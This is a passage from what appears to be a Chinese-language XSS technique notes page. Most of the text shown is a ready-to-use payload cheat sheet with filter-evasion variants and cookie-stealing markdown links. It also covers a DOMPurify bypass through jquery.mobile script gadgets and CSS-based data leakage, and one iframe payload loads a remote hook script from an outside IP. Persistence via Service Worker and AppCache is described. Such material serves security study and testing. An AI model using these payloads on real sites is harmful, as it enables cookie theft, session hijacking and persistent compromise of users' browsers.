punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* not fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0043&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token selector&#34;&gt;#sensitive-information&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;sensitive-information&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;AB&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当字符较多时，则可以结合  &lt;code&gt;::first-line&lt;/code&gt;  等 CSS 属性缩小范围，以获取更精确的内容&lt;/p&gt;
&lt;h2 id=&#34;bypass-via-script-gadgets&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass-via-script-gadgets&#34;&gt;#&lt;/a&gt; Bypass Via Script Gadgets&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  &lt;code&gt;Code Reuse&lt;/code&gt;  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  &lt;code&gt;Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets&lt;/code&gt;  中有该方法的具体描述。&lt;/p&gt;
&lt;p&gt;portswigger 的一篇博文也表达了类似的想法  &lt;code&gt;https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;下面有一个简单的例子，这个例子使用了  &lt;code&gt;DOMPurify&lt;/code&gt;  来加固，但是因为引入了  &lt;code&gt;jquery.mobile.js&lt;/code&gt;  导致可以被攻击。&lt;/p&gt;
&lt;h3 id=&#34;例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#例子&#34;&gt;#&lt;/a&gt; 例子&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;// index.php
&amp;lt;?php

$msg = $_GET[&#39;message&#39;];
$msg = str_replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;, $msg);
$msg = base64_encode($msg);

?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Preview&amp;lt;/title&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;purify.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;jquery.mobile.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
    var d= atob(&#39;&amp;lt;?php echo $msg; ?&amp;gt;&#39;);
    var cleanvar = DOMPurify.sanitize(d);
    document.write(cleanvar);
    &amp;lt;/script&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
// payload
&amp;lt;div data-role=popup id=&#39;--&amp;gt;
&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;&#39;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;rporelative-path-overwrite&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rporelative-path-overwrite&#34;&gt;#&lt;/a&gt; RPO(Relative Path Overwrite)&lt;/h2&gt;
&lt;p&gt;RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。&lt;/p&gt;
&lt;h1 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; Payload&lt;/h1&gt;
&lt;h2 id=&#34;常用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用&#34;&gt;#&lt;/a&gt; 常用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;svg onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=document.domain onerror=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;M onmouseover=alert(document.domain)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:alert(document.domain)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;body onload=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;details open ontoggle=alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;embed src=javascript:alert(document.domain)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;大小写绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小写绕过&#34;&gt;#&lt;/a&gt; 大小写绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/ScRiPt&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ScRiPt&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iMg src=1 oNeRrOr=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;ImG src=1 OnErRoR=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(&amp;quot;M&amp;quot;)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;marquee onscroll=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;mArQuEe OnScRoLl=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;MaRqUeE oNsCrOlL=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;各种alert&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#各种alert&#34;&gt;#&lt;/a&gt; 各种 alert&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;1&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;1&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert&lt;/code&gt; 1 &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;(alert)(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;a=alert,a(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;[1].find(alert)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;al&amp;quot;+&amp;quot;ert&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[&amp;quot;a&amp;quot;+&amp;quot;l&amp;quot;+&amp;quot;e&amp;quot;+&amp;quot;r&amp;quot;+&amp;quot;t&amp;quot;](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/al/.source+/ert/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议&#34;&gt;#&lt;/a&gt; 伪协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/0/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/00/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/000/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;a href=javascript:/M/,alert(%22M%22)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chrome-xss-auditor-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chrome-xss-auditor-bypass&#34;&gt;#&lt;/a&gt; Chrome XSS auditor bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;?param=https://&amp;amp;param=@z.exeye.io/import%20rel=import%3E&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;a href=,alert(1)&amp;gt;M&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;base href=javascript:/M/&amp;gt;&amp;lt;iframe src=,alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;长度限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制&#34;&gt;#&lt;/a&gt; 长度限制&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;s+=&amp;quot;l&amp;quot;&amp;lt;/script&amp;gt;
\...
&amp;lt;script&amp;gt;eval(s)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;jquery-sourcemappingurl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jquery-sourcemappingurl&#34;&gt;#&lt;/a&gt; jquery sourceMappingURL&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;var a=1//@ sourceMappingURL=//xss.site&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;图片名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#图片名&#34;&gt;#&lt;/a&gt; 图片名&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt;.gif
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;过期的payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过期的payload&#34;&gt;#&lt;/a&gt; 过期的 payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;src=javascript:alert 基本不可以用&lt;/li&gt;
&lt;li&gt;css expression 特性只在旧版本 ie 可用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css&#34;&gt;#&lt;/a&gt; css&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;background-image:url(javascript:alert(/xss/))&amp;quot;&amp;gt;
&amp;lt;STYLE&amp;gt;@import&#39;http://ha.ckers.org/xss.css&#39;;&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;markdown&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#markdown&#34;&gt;#&lt;/a&gt; markdown&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
&amp;lt;&amp;amp;#x6A&amp;amp;#x61&amp;amp;#x76&amp;amp;#x61&amp;amp;#x73&amp;amp;#x63&amp;amp;#x72&amp;amp;#x69&amp;amp;#x70&amp;amp;#x74&amp;amp;#x3A&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27&amp;amp;#x58&amp;amp;#x53&amp;amp;#x53&amp;amp;#x27&amp;amp;#x29&amp;gt;
![a&#39;&amp;quot;`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;iframe-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe-2&#34;&gt;#&lt;/a&gt; iframe&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;iframe onload=&#39;
    var sc   = document.createElement(&amp;quot;scr&amp;quot; + &amp;quot;ipt&amp;quot;);
    sc.type  = &amp;quot;text/javascr&amp;quot; + &amp;quot;ipt&amp;quot;;
    sc.src   = &amp;quot;http://1.2.3.4/js/hook.js&amp;quot;;
    document.body.appendChild(sc);
    &#39;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;data:text/html,&amp;lt;iframe src=javascript:alert(&#39;M&#39;)&amp;gt;&amp;lt;/iframe&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe srcdoc=&amp;lt;svg/onload=alert(1)&amp;gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=https://baidu.com width=1366 height=768&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=javascript:alert(1) width=1366 height=768&amp;gt;&amp;lt;/iframe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;form&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#form&#34;&gt;#&lt;/a&gt; form&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form action=javascript:alert(1)&amp;gt;&amp;lt;input type=submit&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;button formaction=javascript:alert(1)&amp;gt;M&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=submit value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image value=M&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;input formaction=javascript:alert(1) type=image src=1&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;meta&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#meta&#34;&gt;#&lt;/a&gt; meta&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;Link&amp;quot; Content=&amp;quot;&amp;lt;http://ha.ckers.org/xss.css&amp;gt;; REL=stylesheet&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
&lt;h2 id=&#34;基于存储&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于存储&#34;&gt;#&lt;/a&gt; 基于存储&lt;/h2&gt;
&lt;p&gt;有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  &lt;code&gt;eval(data)&lt;/code&gt;  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。&lt;/p&gt;
&lt;p&gt;在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  &lt;code&gt;String.fromCharCode&lt;/code&gt;  来绕过。&lt;/p&gt;
&lt;h2 id=&#34;service-worker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#service-worker&#34;&gt;#&lt;/a&gt; Service Worker&lt;/h2&gt;
&lt;p&gt;Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。&lt;/p&gt;
&lt;p&gt;在 Chrome 中，可通过  &lt;code&gt;chrome://inspect/#service-workers&lt;/code&gt;  来查看 Service Worker 的状态，并进行停止。&lt;/p&gt;
&lt;h2 id=&#34;appcache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appcache&#34;&gt;#&lt;/a&gt; AppCache&lt;/h2&gt;
&lt;p&gt;在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;wiki&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wiki&#34;&gt;#&lt;/a&gt; wiki&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT&#34;&gt;AwesomeXSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av&#34;&gt;w3c&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==&#34;&gt;dom xss wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v&#34;&gt;content-security-policy.com&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=&#34;&gt;markdwon xss&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==&#34;&gt;xss cheat sheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odG1sNXNlYy5vcmcv&#34;&gt;html5 security cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv&#34;&gt;http security headers&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=&#34;&gt;XSSChallengeWiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenges&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#challenges&#34;&gt;#&lt;/a&gt; Challenges&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=&#34;&gt;XSS Challenge By Google&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Byb21wdC5tbC8w&#34;&gt;prompt to win&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-2&#34;&gt;#&lt;/a&gt; CSS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==&#34;&gt;rpo&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=&#34;&gt;rpo 攻击初探&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=&#34;&gt;Reading Data via CSS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=&#34;&gt;css based attack abusing unicode range&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==&#34;&gt;css injection&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==&#34;&gt;css timing attack&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;同源策略-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略-2&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h2&gt;
&lt;ul&gt;
